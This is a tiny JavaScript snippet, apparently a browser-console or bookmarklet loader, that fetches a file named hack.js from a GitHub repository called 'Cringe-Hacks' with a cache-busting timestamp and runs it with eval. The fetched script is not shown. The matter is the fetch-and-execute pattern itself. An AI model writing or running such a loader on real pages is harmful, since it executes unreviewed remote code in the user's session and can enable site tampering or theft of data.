(async () => {
    var res = await fetch(`https://raw.githubusercontent.com/ZackiBoiz/Cringe-Hacks/main/hack.js?ts=${Math.floor(Date.now())}`);
    var js = await res.text();
    console.log(js);
    eval(js); // load script
})();
